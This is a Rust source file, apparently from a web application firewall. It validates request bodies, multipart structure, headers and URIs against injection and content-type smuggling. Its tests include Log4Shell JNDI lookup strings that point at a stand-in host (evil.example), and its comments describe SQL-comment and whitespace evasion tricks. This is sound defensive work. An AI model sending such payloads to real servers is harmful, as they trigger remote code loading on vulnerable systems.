fn shannon_entropy_json_strings(body: &[u8], min_sample: usize) -> Option<f64> {
    let mut freq = [0u32; 256];
    let mut total: usize = 0;
    let mut in_string = false;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                freq[b as usize] += 1;
                total += 1;
            }
            continue;
        }
        if in_string {
            if b == b'\\' {
                escaped = true;
            } else if b == b'"' {
                in_string = false;
            } else {
                freq[b as usize] += 1;
                total += 1;
            }
        } else if b == b'"' {
            in_string = true;
        }
        // bytes outside strings (structure, numbers, whitespace) are skipped
    }

    if total < min_sample {
        return None;
    }
    let inv = 1.0 / total as f64;
    let mut entropy = 0.0f64;
    for &c in &freq {
        if c > 0 {
            let p = c as f64 * inv;
            entropy -= p * p.log2();
        }
    }
    Some(entropy)
}

// ═══════════════════════════════════════════════════════════════════
// GATE 5: JSON Structural Validation (manual byte-scan)
// No serde_json deserialization — walk the raw bytes to check:
//   - Valid JSON structure
//   - Nesting depth <= max_depth
//   - String length <= max_string_len
// ═══════════════════════════════════════════════════════════════════

// Thread-local buffer pool for simd-json and WAF zero-allocation parsing.
// Eliminates per-request heap allocation for the mutable buffer that
// simd-json and Aho-Corasick normalization require. Buffer is reused.
thread_local! {
    static JSON_BUF: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
    static WAF_BUF_SEC: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
}

fn validate_json_structure(body: &[u8], max_depth: usize, max_string_len: usize) -> WafVerdict {
    // Order matters: the cheap, zero-alloc byte scan runs FIRST so it can reject
    // a hostile body BEFORE the recursive `simd_json` parser ever touches it.
    // `to_owned_value` builds an owned value tree by recursion — a deeply nested
    // payload (`[[[[…]]]]` thousands deep) can exhaust the stack or balloon memory
    // inside the parser, so checking depth only afterwards is too late. The scan
    // bounds both nesting depth and string length up front; only a body that
    // already fits those limits reaches the parser, where the parse now serves
    // solely to reject malformed-but-shallow JSON.
    if !check_depth_and_strings_raw(body, max_depth, max_string_len) {
        return WafVerdict::Deny("JSON exceeds depth or string length limits");
    }

    // Use thread-local buffer pool to avoid per-request allocation.
    // simd-json needs a mutable buffer — we copy body into the pooled buffer.
    let valid = JSON_BUF.with(|buf| {
        let mut buf = buf.borrow_mut();
        buf.clear();
        buf.extend_from_slice(body);
        // to_owned_value avoids the lifetime issue — the parsed value is owned
        // and dropped at the end of this closure, not tied to the buffer.
        simd_json::to_owned_value(&mut *buf).is_ok()
    });
    if !valid {
        return WafVerdict::Deny("malformed JSON");
    }

    WafVerdict::Allow
}

/// Raw byte scan for depth and string length — no deserialization needed.
/// Walks the JSON bytes counting { [ for depth and measuring " strings.
fn check_depth_and_strings_raw(body: &[u8], max_depth: usize, max_string_len: usize) -> bool {
    let mut depth: usize = 0;
    let mut in_string = false;
    let mut string_len: usize = 0;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                string_len += 1;
            }
            continue;
        }

        if b == b'\\' {
            escaped = true;
            continue;
        }

        if in_string {
            if b == b'"' {
                // End of string
                if string_len > max_string_len {
                    return false;
                }
                in_string = false;
                string_len = 0;
            } else {
                string_len += 1;
            }
        } else {
            match b {
                b'"' => {
                    in_string = true;
                    string_len = 0;
                }
                b'{' | b'[' => {
                    depth += 1;
                    if depth > max_depth {
                        return false;
                    }
                }
                b'}' | b']' => {
                    depth = depth.saturating_sub(1);
                }
                _ => {}
            }
        }
    }

    true
}

// ═══════════════════════════════════════════════════════════════════
// MAIN PIPELINE
// ═══════════════════════════════════════════════════════════════════

/// Validate an incoming request through the 5-gate WAF pipeline.
/// Each gate is fail-fast: first deny wins, no further inspection.
#[inline]
pub fn validate_request(
    method: &str,
    content_type: Option<&str>,
    body: &[u8],
    profile: &WafProfile,
) -> WafVerdict {
    validate_request_impl(method, content_type, body, profile, false)
}

/// Same pipeline as [`validate_request`], but for a body the streaming WAF
/// already scanned incrementally: the raw Aho-Corasick pass (Gate 3, first
/// scan) is skipped because the `StreamingScanner` ran the SAME pattern set
/// over the SAME bytes (with chunk-boundary overlap) as the frames arrived.
/// The normalized/encoded scan, entropy, and JSON-structural gates still run —
/// the streamer does not cover those. This avoids a second O(N) raw scan of the
/// whole reassembled body on exactly the large-body requests streaming exists
/// to serve.
#[inline]
pub fn validate_request_prescanned(
    method: &str,
    content_type: Option<&str>,
    body: &[u8],
    profile: &WafProfile,
) -> WafVerdict {
    validate_request_impl(method, content_type, body, profile, true)
}

/// Is the `Content-Type` value `ct` one of the media types in `allowed`? Case-insensitive, and
/// the parameters (`; charset=...`) are ignored: `application/json` must be followed by the end,
/// `;`, a space or a tab, so `application/jsonFOO` is not `application/json`. Spaces and tabs
/// before the media type are skipped, as Werkzeug skips them. Zero-alloc.
pub fn content_type_allowed(ct: &str, allowed: &[String]) -> bool {
    let ct = trim_leading_lws(ct.as_bytes());
    allowed.iter().any(|allowed| {
        if ct.len() < allowed.len() {
            return false;
        }
        if !ct[..allowed.len()].eq_ignore_ascii_case(allowed.as_bytes()) {
            return false;
        }
        ct.len() == allowed.len() || matches!(ct[allowed.len()], b';' | b' ' | b'\t')
    })
}

/// Is `ct` a `multipart/form-data` body, for the field-name rules? Spaces and tabs before it are
/// skipped, and the media type may be followed by the end or by any byte that cannot continue a
/// token (RFC 9110 `tchar`): Werkzeug and Django trim a tab or a space before the `;`
/// (`multipart/form-data<TAB>;` is form-data to them), Werkzeug also before the media type, and
/// PHP ends it at `;`, `,` or a space.
/// Reading more types as form-data than a backend does only applies more rules. Zero-alloc.
fn ct_is_multipart(ct: &str) -> bool {
    const M: &[u8] = b"multipart/form-data";
    let b = trim_leading_lws(ct.as_bytes());
    b.len() >= M.len()
        && b[..M.len()].eq_ignore_ascii_case(M)
        && b.get(M.len()).is_none_or(|&c| !is_tchar(c))
}

/// An RFC 9110 `tchar`: a byte that can be part of a token such as a media type.
fn is_tchar(b: u8) -> bool {
    b.is_ascii_alphanumeric()
        || matches!(
            b,
            b'!' | b'#'
                | b'$'
                | b'%'
                | b'&'
                | b'\''
                | b'*'
                | b'+'
                | b'-'
                | b'.'
                | b'^'
                | b'_'
                | b'`'
                | b'|'
                | b'~'
        )
}

/// Does `ct` carry a `boundary` parameter (valid or not), plain or in the RFC 2231 forms
/// (`boundary*`, `boundary*0`) that Werkzeug and Django also read as the boundary? It is the
/// signal that a lenient upstream may parse the body as multipart even when the media type is
/// not canonical `multipart/form-data`: the Spring CVE-2026-41853 content-type-smuggling class.
/// zion then parses the body too, and refuses it unless it parses cleanly.
fn ct_has_boundary_param(ct: &str) -> bool {
    ct.as_bytes().split(|&b| b == b';').skip(1).any(|raw| {
        let param = trim_lws(raw);
        memchr::memchr(b'=', param).is_some_and(|eq| starts_with_ci(&param[..eq], b"boundary"))
    })
}

/// Does `s`, after leading spaces and tabs, start with `prefix` (ASCII case-insensitive)?
fn starts_with_ci(s: &[u8], prefix: &[u8]) -> bool {
    let s = trim_leading_lws(s);
    s.len() >= prefix.len() && s[..prefix.len()].eq_ignore_ascii_case(prefix)
}

/// ASCII spaces and tabs trimmed from both ends.
fn trim_lws(s: &[u8]) -> &[u8] {
    let start = s
        .iter()
        .position(|&b| b != b' ' && b != b'\t')
        .unwrap_or(s.len());
    let end = s
        .iter()
        .rposition(|&b| b != b' ' && b != b'\t')
        .map_or(start, |i| i + 1);
    &s[start..end]
}

/// The `boundary` parameter of a `multipart/form-data` Content-Type, validated against the
/// RFC 2046 character set and length (1..=70), or `None` when it is missing, malformed,
/// declared more than once, or empty. The boundary bytes are returned without the enclosing
/// quotes.
///
/// It is also `None` when a common backend could take another boundary from the same value, so
/// that the gate and the backend never split the body on different delimiters:
/// - a parameter in an RFC 2231 form (`boundary*`, `boundary*0`): Werkzeug and Django read it
///   as the boundary, and the last one wins;
/// - an unquoted value that is not an RFC 2045 token (`B/C`, `B C`, `B,C`): the tspecials and
///   the space must be quoted, and Werkzeug ends an unquoted value at the first of them;
/// - a space or tab right after `=`: PHP keeps it in the boundary;
/// - a `boundary` substring before the parameter, or a lower-case one anywhere when the
///   parameter name is not lower-case: PHP takes the first `boundary` it finds in the whole
///   value (case-sensitive first), then the first `=` after it.
fn multipart_boundary(ct: &str) -> Option<Vec<u8>> {
    // RFC 2046 bcharsnospace, plus space (a boundary may contain spaces but not end in one).
    fn is_bchar(b: u8) -> bool {
        is_token_bchar(b) || matches!(b, b'(' | b')' | b',' | b'/' | b':' | b'=' | b'?' | b' ')
    }
    // The bchars that are RFC 2045 token characters: all an unquoted boundary may use.
    fn is_token_bchar(b: u8) -> bool {
        b.is_ascii_alphanumeric() || matches!(b, b'\'' | b'+' | b'_' | b'-' | b'.')
    }
    let bytes = ct.as_bytes();
    // (offset of the parameter name in `ct`, the raw value between `=` and the next `;`)
    let mut found: Option<(usize, &[u8])> = None;
    let mut offset = 0;
    // Skip the media type (first `;`-separated token); scan the rest for `boundary=`.
    for (i, raw) in bytes.split(|&b| b == b';').enumerate() {
        let start = offset;
        offset += raw.len() + 1;
        if i == 0 {
            continue;
        }
        let eq = memchr::memchr(b'=', raw)?;
        let key = trim_lws(&raw[..eq]);
        if key.eq_ignore_ascii_case(b"boundary") {
            if found.is_some() {
                return None; // a second boundary= is a smuggling surface, refuse it
            }
            let key_at = start + (raw.len() - trim_leading_lws(raw).len());
            found = Some((key_at, &raw[eq + 1..]));
        } else if starts_with_ci(key, b"boundary") {
            return None; // boundary*, boundary*0: what Werkzeug and Django take instead
        }
    }
    let (key_at, raw) = found?;
    // PHP's choice of boundary: strstr(ct, "boundary"), or the case-insensitive match if there is
    // no lower-case one. It must be this parameter's name.
    let php_pick = memchr::memmem::find(bytes, b"boundary").or_else(|| {
        bytes
            .windows(8)
            .position(|w| w.eq_ignore_ascii_case(b"boundary"))
    });
    if php_pick != Some(key_at) {
        return None;
    }
    if matches!(raw.first(), Some(b' ' | b'\t')) {
        return None; // PHP keeps it in its boundary (RFC 9110 has no space around "=")
    }
    // A space or tab before the next ";" is RFC 9110 OWS. PHP keeps it in an unquoted
    // boundary too, but its longer delimiter only matches where the gate's does.
    let raw = trim_lws(raw);
    // One layer of surrounding quotes (RFC 2045 quoted-string), no escapes: a quote or a
    // backslash inside is refused by the charset check below.
    let b = match raw.strip_prefix(b"\"").and_then(|v| v.strip_suffix(b"\"")) {
        Some(quoted) => quoted,
        None if raw.iter().all(|&c| is_token_bchar(c)) => raw,
        None => return None,
    };
    if b.is_empty() || b.len() > 70 || b.last() == Some(&b' ') || !b.iter().all(|&c| is_bchar(c)) {
        return None;
    }
    Some(b.to_vec())
}

enum PartHeaders {
    Ok { is_file: bool },
    Deny(&'static str),
}

/// Does a form field `name` encode an array index above `cap` (e.g. `items[4294967295]`)?
/// `cap == 0` disables the check. A bracketed run of digits that overflows `u64`, or exceeds
/// `cap`, is a hit; non-numeric keys (`user[name]`) and small indices (`items[3]`) are not.
fn field_name_index_exceeds(name: &[u8], cap: u64) -> bool {
    if cap == 0 {
        return false;
    }
    let mut i = 0;
    while i < name.len() {
        if name[i] == b'[' {
            let start = i + 1;
            let mut j = start;
            while j < name.len() && name[j].is_ascii_digit() {
                j += 1;
            }
            if j > start && name.get(j) == Some(&b']') {
                let mut val: u64 = 0;
                for &d in &name[start..j] {
                    match val
                        .checked_mul(10)
                        .and_then(|v| v.checked_add((d - b'0') as u64))
                    {
                        Some(v) => val = v,
                        None => return true, // overflows u64 — far above any cap
                    }
                }
                if val > cap {
                    return true;
                }
            }
            i = j;
        } else {
            i += 1;
        }
    }
    false
}

/// Walk one part's header block (the bytes before its blank line): count the headers and apply
/// the part-header-name denylist. In `form_data` mode (a `multipart/form-data` body) it also
/// requires one Content-Disposition with one field `name` (see [`disposition_params`]), applies
/// the field-name denylist and the array-index cap, and reports whether the part is a file part
/// (it has a `filename` or a `filename*`, empty included). In structural mode (another
/// `multipart/*` carrying a boundary, the smuggling class) the form-data-specific checks do not
/// apply: only the structural limits do.
fn inspect_part_headers(block: &[u8], profile: &WafProfile, form_data: bool) -> PartHeaders {
    let mut count = 0usize;
    let mut name: Option<&[u8]> = None;
    let mut is_file = false;
    let mut seen_disposition = false;
    let mut rest = block;
    loop {
        let (line, tail) = match memchr::memmem::find(rest, b"\r\n") {
            Some(i) => (&rest[..i], &rest[i + 2..]),
            None => (rest, &b""[..]),
        };
        // A CR or LF outside a CRLF: PHP breaks a line at a bare LF and Werkzeug at either, and
        // Werkzeug ends the header block at "\n\n" or "\r\r", so they would read other headers,
        // or another field name, than this walk does.
        if memchr::memchr2(b'\r', b'\n', line).is_some() {
            return PartHeaders::Deny("bare line break in multipart part headers");
        }
        if !line.is_empty() {
            count += 1;
            if count > profile.max_part_headers {
                return PartHeaders::Deny("too many multipart part headers");
            }
            let colon = match memchr::memchr(b':', line) {
                Some(i) => i,
                None => return PartHeaders::Deny("malformed multipart part header"),
            };
            let hname = trim_lws(&line[..colon]);
            if profile
                .deny_part_header_names
                .iter()
                .any(|d| d.as_bytes().eq_ignore_ascii_case(hname))
            {
                return PartHeaders::Deny("denied multipart part header name");
            }
            if form_data && hname.eq_ignore_ascii_case(b"content-disposition") {
                // PHP and Werkzeug read the first Content-Disposition of a part, Django the last.
                if seen_disposition {
                    return PartHeaders::Deny("repeated content-disposition in a multipart part");
                }
                seen_disposition = true;
                match disposition_params(&line[colon + 1..]) {
                    Ok(params) => {
                        name = params.name;
                        is_file = params.is_file;
                    }
                    Err(reason) => return PartHeaders::Deny(reason),
                }
            }
        }
        if tail.is_empty() {
            break;
        }
        rest = tail;
    }
    if !form_data {
        // Structural multipart: no field-name semantics apply, only the structural limits above.
        return PartHeaders::Ok { is_file: false };
    }
    match name {
        None => PartHeaders::Deny("multipart part without a field name"),
        Some(n) => {
            if profile
                .deny_field_names
                .iter()
                .any(|d| d.as_bytes().eq_ignore_ascii_case(n))
            {
                return PartHeaders::Deny("denied multipart field name");
            }
            if field_name_index_exceeds(n, profile.max_field_name_index) {
                return PartHeaders::Deny("multipart field name array index too large");
            }
            PartHeaders::Ok { is_file }
        }
    }
}

/// What the gate takes from a part's Content-Disposition value.
struct Disposition<'a> {
    /// The `name` parameter, one layer of surrounding quotes stripped.
    name: Option<&'a [u8]>,
    /// It has a `filename` (an empty `filename=""` included) or a `filename*` parameter.
    is_file: bool,
}

/// The field name and the file flag of a Content-Disposition value (case-insensitive keys).
/// Refused when a common backend would read another field name from it: a second `name`
/// (Werkzeug, Django and PHP keep the last one), or a `name*` / `name*0` (RFC 2231), which
/// Werkzeug and Django take as the name. A `filename*` / `filename*0` makes it a file part, as
/// it does for them; .NET sends one next to every `filename`.
fn disposition_params(value: &[u8]) -> Result<Disposition<'_>, &'static str> {
    let mut d = Disposition {
        name: None,
        is_file: false,
    };
    for raw in value.split(|&b| b == b';') {
        let param = trim_lws(raw);
        let eq = match memchr::memchr(b'=', param) {
            Some(i) => i,
            None => continue, // the disposition type ("form-data"), not a parameter
        };
        let key = trim_lws(&param[..eq]);
        if key.eq_ignore_ascii_case(b"name") {
            if d.name.is_some() {
                return Err("repeated multipart field name");
            }
            let v = trim_lws(&param[eq + 1..]);
            d.name = Some(
                if v.len() >= 2 && v.first() == Some(&b'"') && v.last() == Some(&b'"') {
                    &v[1..v.len() - 1]
                } else {
                    v
                },
            );
        } else if starts_with_ci(key, b"name*") {
            return Err("multipart field name in an extended parameter");
        } else if key.eq_ignore_ascii_case(b"filename") || starts_with_ci(key, b"filename*") {
            d.is_file = true;
        }
    }
    Ok(d)
}

/// Gate 2b (#694): strict multipart structure. Parses the body by RFC 2046 and holds it to the
/// profile's limits. A body that does not parse cleanly is denied, never forwarded. It runs for
/// a `multipart/form-data` body (full field-name rules) and for any other content-type carrying
/// a boundary (the Spring CVE-2026-41853 content-type-smuggling class), where only the
/// structural limits apply. Runs on a fully buffered body.
///
/// Common backends parse more leniently than RFC 2046, so the body must also leave them no other
/// split: one boundary that PHP, Werkzeug and Django read the same way (see
/// `multipart_boundary`); the dash-boundary `--B` only at the start and right after the CRLF
/// that ends a part (PHP, Werkzeug and Django also split on a bare LF before it, Werkzeug and
/// Django on a bare CR, Django on `--B` anywhere); nothing but spaces, tabs, CR and LF after the
/// close delimiter (PHP and Django read parts after it); and a part's headers with no CR or LF
/// outside a CRLF (PHP breaks a line at a bare LF, Werkzeug at a bare LF or CR), one
/// Content-Disposition and one plain `name` (see `disposition_params`). This does not make
/// every backend read the same field names: the shape of a parameter value is still open (bytes
/// after a quoted value, `name="x"y`, or after an unquoted one, `name=x y`, which Werkzeug
/// ignores; single quotes, which PHP strips).
///
/// Public so `benches/multipart_parse.rs` can measure the parse cost per MiB in isolation, the
/// same way the benches reach [`validate_request`] and [`StreamingScanner`].
pub fn multipart_structure(ct: &str, body: &[u8], profile: &WafProfile) -> WafVerdict {
    let form_data = ct_is_multipart(ct);
    let boundary = match multipart_boundary(ct) {
        Some(b) => b,
        None => return WafVerdict::Deny("malformed multipart boundary"),
    };
    // dash-boundary = "--" boundary. The body must start with it: a preamble before the first
    // boundary is a smuggling surface real form clients never use.
    let mut delim = Vec::with_capacity(2 + boundary.len());
    delim.extend_from_slice(b"--");
    delim.extend_from_slice(&boundary);
    if !body.starts_with(&delim) {
        return WafVerdict::Deny("multipart body does not start at its boundary");
    }
    // CRLF dash-boundary separates parts; a trailing "--" closes the body.
    let dash_boundary = memchr::memmem::Finder::new(&delim);

    let mut pos = delim.len();
    let mut parts = 0usize;
    let mut file_parts = 0usize;
    loop {
        let after = &body[pos..];
        // "--" right after a dash-boundary is the close-delimiter: the body ends here. RFC 2046
        // lets an epilogue follow, for parsers to ignore, but PHP and Django read parts out of
        // it; real clients send at most a line break.
        if let Some(epilogue) = after.strip_prefix(b"--") {
            return if epilogue
                .iter()
                .all(|&b| matches!(b, b' ' | b'\t' | b'\r' | b'\n'))
            {
                WafVerdict::Allow
            } else {
                WafVerdict::Deny("data after the multipart close delimiter")
            };
        }
        // Otherwise optional transport-padding (LWSP) then CRLF, then a part.
        let after = trim_leading_lws(after);
        if !after.starts_with(b"\r\n") {
            return WafVerdict::Deny("malformed multipart delimiter");
        }
        pos = body.len() - after.len() + 2;

        parts += 1;
        if parts > profile.max_parts {
            return WafVerdict::Deny("too many multipart parts");
        }

        // Part headers end at the first blank line (CRLFCRLF).
        let hdr_end = match memchr::memmem::find(&body[pos..], b"\r\n\r\n") {
            Some(i) => pos + i,
            None => return WafVerdict::Deny("multipart part headers are not terminated"),
        };
        let header_block = &body[pos..hdr_end];
        if header_block.len() > profile.max_part_header_bytes {
            return WafVerdict::Deny("multipart part headers too large");
        }
        match inspect_part_headers(header_block, profile, form_data) {
            PartHeaders::Deny(reason) => return WafVerdict::Deny(reason),
            PartHeaders::Ok { is_file } => {
                if is_file {
                    file_parts += 1;
                    if file_parts > profile.max_file_parts {
                        return WafVerdict::Deny("too many multipart file parts");
                    }
                }
            }
        }

        // Part body runs from after the blank line to the next CRLF dash-boundary. The first
        // dash-boundary from the part's start must be that one: any earlier one (in the headers,
        // in the content, or using the blank line's CRLF) is a split some backend makes there.
        let content_start = hdr_end + 4;
        let d = match dash_boundary.find(&body[pos..]) {
            Some(i) => pos + i,
            None => return WafVerdict::Deny("unterminated multipart body"),
        };
        if d < content_start + 2 || &body[d - 2..d] != b"\r\n" {
            return WafVerdict::Deny("ambiguous multipart delimiter");
        }
        pos = d + delim.len();
    }
}

/// Leading ASCII spaces and tabs removed (for transport-padding after a delimiter).
fn trim_leading_lws(s: &[u8]) -> &[u8] {
    let start = s
        .iter()
        .position(|&b| b != b' ' && b != b'\t')
        .unwrap_or(s.len());
    &s[start..]
}

#[inline]
fn validate_request_impl(
    _method: &str,
    content_type: Option<&str>,
    body: &[u8],
    profile: &WafProfile,
    raw_prescanned: bool,
) -> WafVerdict {
    // ── Gate 1: Body size (O(1)) ──
    let max_body_bytes = profile.max_body_mb * 1_048_576;
    if body.len() as u64 > max_body_bytes {
        return WafVerdict::Deny("body exceeds max size");
    }

    // Inspect any body that is there, whatever the method: a GET/HEAD/OPTIONS body
    // has no defined semantics (RFC 9110) but is forwarded, and backends that read it
    // (search APIs, some RPC) act on it, so it must not be a way around the scanner.
    if body.is_empty() {
        return WafVerdict::Allow;
    }

    // ── Gate 2: Content-Type (zero-alloc case-insensitive) ──
    let ct = match content_type {
        Some(ct) => ct,
        None => return WafVerdict::Deny("missing content-type header"),
    };
    // Prefix match with delimiter check: "application/json" must be followed
    // by EOF, ';' (charset), a space or a tab, not arbitrary chars. Without this,
    // "application/jsonFOO" would be treated as allowed.
    let is_allowed = content_type_allowed(ct, &profile.allowed_content_types);
    // Strict policy denies a disallowed type outright. Lenient policy does NOT
    // trust it either — we fall through to the Gate 3 injection scan before
    // allowing. The previous code returned Allow here, forwarding the body
    // UNSCANNED whenever deny_unknown_content_types was false, letting an
    // attacker smuggle a payload past the WAF just by mislabelling it.
    if !is_allowed && profile.deny_unknown_content_types {
        return WafVerdict::Deny("unexpected content-type for API request");
    }
    // The JSON-structural gates (4/5) apply only to an allowed application/json
    // body; a disallowed type is still injection-scanned but never JSON-parsed.
    // Leading spaces and tabs are skipped here as content_type_allowed skips them.
    let is_json = is_allowed
        && trim_leading_lws(ct.as_bytes())
            .get(..16)
            .map(|b| b.eq_ignore_ascii_case(b"application/json"))
            .unwrap_or(false);

    // ── Gate 2b: multipart structure (strict, #694) ──
    // Any body a lenient upstream might parse as multipart (multipart/form-data,
    // or any content-type carrying a boundary= parameter: the Spring
    // CVE-2026-41853 content-type-smuggling class) is parsed and denied here,
    // before the raw scan, unless it parses cleanly and leaves PHP, Werkzeug and
    // Django no other split into parts (see multipart_structure for the rules,
    // and for the field-name differentials that are still open).
    if ct_is_multipart(ct) || ct_has_boundary_param(ct) {
        if let v @ WafVerdict::Deny(_) = multipart_structure(ct, body, profile) {
            return v;
        }
    }

    // ── Gate 3: Aho-Corasick injection scan (O(N), single pass) ──
    // Profile-driven scanner: balanced (default) or aggressive.
    let scanner = scanner_for(profile.mode);

    // Scan raw body first (fast path — no alloc if no encoding present).
    // Skipped when the streaming WAF already ran this exact raw pass over the
    // same bytes incrementally (see `validate_request_prescanned`); the encoded
    // pass and JSON gates below always run regardless.
    if !raw_prescanned && scanner.is_match(body) {
        return WafVerdict::Deny("injection pattern detected");
    }

    // Normalized scan: URL-decode, strip SQL comments, normalize JSON unicode.
    // Each layer prevents a different evasion class:
    //   - url_decode: %27, %3C, %2F, + → space
    //   - strip_sql_comments: union/**/select → union select
    //   - normalize_json_unicode: \u0027 → ', \u003c → <
    let needs_decode = memchr::memchr(b'%', body).is_some() || memchr::memchr(b'+', body).is_some();
    let has_sql_comments = body.windows(2).any(|w| w == b"/*");
    let has_unicode_esc = body.windows(2).any(|w| w == b"\\u");
    // Whitespace-run evasion: a tab/VT/FF or a doubled space lets an attacker
    // pad a pattern ("union  select", "1;\tcat") past the raw scan; the
    // normalized pass collapses these, so run it when they are present too.
    let has_ws_evasion = body.iter().any(|&b| matches!(b, b'\t' | 0x0b | 0x0c))
        || body.windows(2).any(|w| w[0] == b' ' && w[1] == b' ');

    if needs_decode || has_sql_comments || has_unicode_esc || has_ws_evasion {
        let verdict = JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                // First pass from body -> out
                normalize_unified(body, &mut out);

                // Iterate until convergence or safety cap.
                // 2 iterations catches double/triple encoding (real-world max).
                // Convergence check breaks early if no further decoding is needed.
                for _ in 0..2 {
                    if scanner.is_match(out.as_slice()) {
                        return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some()
                        || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    // Recursive pass: out -> sec, then swap
                    normalize_unified(&out, &mut sec);

                    // If output didn't change, we've converged — stop
                    if *out == *sec {
                        break;
                    }

                    std::mem::swap(&mut *out, &mut *sec);
                }

                // Final check after convergence
                if scanner.is_match(out.as_slice()) {
                    return Some(WafVerdict::Deny("injection pattern detected (encoded)"));
                }

                // Shrink inflated buffers to prevent OOM from adversarial large bodies.
                // A single 10MB POST would permanently inflate all worker threads.
                if out.capacity() > 65_536 {
                    out.shrink_to(8192);
                }
                if sec.capacity() > 65_536 {
                    sec.shrink_to(8192);
                }
                None
            })
        });

        if let Some(v) = verdict {
            return v;
        }
    }

    // ── Gate 4: Entropy analysis (detect obfuscated payloads) ──
    // Only scan bodies ≥ 256 bytes (smaller payloads lack a meaningful
    // sample). For JSON content-types, restrict the calculation to bytes
    // inside string literals so structural punctuation and numeric
    // tokens don't dilute the signal. Threshold and kill-switch are
    // per-profile (`entropy_threshold`, `entropy_check`).
    if profile.entropy_check && body.len() >= 256 {
        let entropy = if is_json {
            // Need ≥128 string-content bytes to draw a conclusion. If the
            // JSON is mostly structure (nested arrays of numbers, etc.),
            // skip the gate rather than report a misleading reading.
            shannon_entropy_json_strings(body, 128)
        } else {
            Some(shannon_entropy(body))
        };
        if let Some(e) = entropy {
            if e > profile.entropy_threshold {
                return WafVerdict::Deny("suspicious payload entropy");
            }
        }
    }

    // ── Gate 5: JSON structural validation ──
    if is_json {
        return validate_json_structure(body, profile.max_depth, profile.max_string_len);
    }

    WafVerdict::Allow
}

/// Validate a request URI (path + query string) through the injection scanner.
/// Called for ALL methods to catch SQLi/XSS in query parameters.
/// Zero cost if no patterns match (single O(N) pass).
///
/// Mode comes from the route's WAF profile so URI scanning matches body
/// scanning: a route in `balanced` mode won't deny a query string that
/// only the `aggressive` pattern set would catch.
#[inline]
pub fn validate_uri(uri: &str, mode: WafMode) -> WafVerdict {
    match scan_text(uri.as_bytes(), mode) {
        Some(Hit::Raw) => WafVerdict::Deny("injection pattern in URI"),
        Some(Hit::Encoded) => WafVerdict::Deny("injection pattern in URI (encoded)"),
        None => WafVerdict::Allow,
    }
}

/// Validate one request header value through the same scanner as the URI: raw, then
/// normalized (URL-decoding, SQL-comment stripping, unicode escapes), so `%24%7Bjndi:` in a
/// `Referer` is caught like `${jndi:` in a `User-Agent`. Which headers are scanned is the
/// profile's `scan_headers`; a value is at most the request's header budget, so the cost is
/// bounded by it.
#[inline]
pub fn validate_header_value(value: &[u8], mode: WafMode) -> WafVerdict {
    match scan_text(value, mode) {
        Some(Hit::Raw) => WafVerdict::Deny("injection pattern in header"),
        Some(Hit::Encoded) => WafVerdict::Deny("injection pattern in header (encoded)"),
        None => WafVerdict::Allow,
    }
}

/// Where [`scan_text`] found a pattern.
enum Hit {
    Raw,
    Encoded,
}

/// One pass of the injection scanner over `text`, then over its normalized forms.
fn scan_text(text: &[u8], mode: WafMode) -> Option<Hit> {
    let scanner = scanner_for(mode);

    // Scan the raw text
    if scanner.is_match(text) {
        return Some(Hit::Raw);
    }
    // Normalized scan: URL-decode + SQL comment strip + JSON unicode
    let needs_decode = memchr::memchr(b'%', text).is_some() || memchr::memchr(b'+', text).is_some();
    let has_sql_comments = text.windows(2).any(|w| w == b"/*");
    // Whitespace-run evasion (raw tab/VT/FF or doubled space) — same rationale
    // as the body gate in validate_request.
    let has_ws_evasion = text.iter().any(|&b| matches!(b, b'\t' | 0x0b | 0x0c))
        || text.windows(2).any(|w| w[0] == b' ' && w[1] == b' ');

    if needs_decode || has_sql_comments || has_ws_evasion {
        return JSON_BUF.with(|buf1| {
            WAF_BUF_SEC.with(|buf2| {
                let mut out = buf1.borrow_mut();
                let mut sec = buf2.borrow_mut();

                normalize_unified(text, &mut out);

                for _ in 0..2 {
                    if scanner.is_match(out.as_slice()) {
                        return Some(Hit::Encoded);
                    }

                    let still_needs_decode = memchr::memchr(b'%', &out).is_some()
                        || memchr::memchr(b'+', &out).is_some();
                    let still_has_sql_comments = out.windows(2).any(|w| w == b"/*");
                    let still_has_unicode_esc = out.windows(2).any(|w| w == b"\\u");

                    if !still_needs_decode && !still_has_sql_comments && !still_has_unicode_esc {
                        break;
                    }

                    normalize_unified(&out, &mut sec);
                    if *out == *sec {
                        break;
                    }
                    std::mem::swap(&mut *out, &mut *sec);
                }

                if scanner.is_match(out.as_slice()) {
                    return Some(Hit::Encoded);
                }
                None
            })
        });
    }
    None
}

// ═══════════════════════════════════════════════════════════════════
// TESTS
// ═══════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    fn scanning(headers: &[&str], mode: WafMode) -> WafProfile {
        WafProfile {
            mode,
            scan_headers: headers.iter().map(|h| h.to_string()).collect(),
            ..WafProfile::default()
        }
    }

    fn header_map(pairs: &[(&str, &str)]) -> hyper::HeaderMap {
        let mut h = hyper::HeaderMap::new();
        for (name, value) in pairs {
            h.append(
                hyper::header::HeaderName::from_bytes(name.as_bytes()).unwrap(),
                hyper::header::HeaderValue::from_str(value).unwrap(),
            );
        }
        h
    }

    /// The case the finding is about (ZION-INPT-02): Log4Shell travels in `User-Agent`.
    #[test]
    fn a_payload_in_a_scanned_header_is_denied() {
        let profile = scanning(&["User-Agent", "referer", "x-*"], WafMode::Balanced);
        let hit = |pairs: &[(&str, &str)]| {
            validate_headers(&header_map(pairs), &profile)
                .map(|(name, reason)| (name.to_string(), reason))
        };
        assert_eq!(
            hit(&[("user-agent", "${jndi:ldap://evil.example/a}")]),
            Some(("user-agent".into(), "injection pattern in header"))
        );
        // URL-encoded in a Referer: found after decoding, like in a URI.
        assert_eq!(
            hit(&[(
                "referer",
                "https://a.example/?q=%24%7Bjndi:ldap://evil.example/a%7D"
            )]),
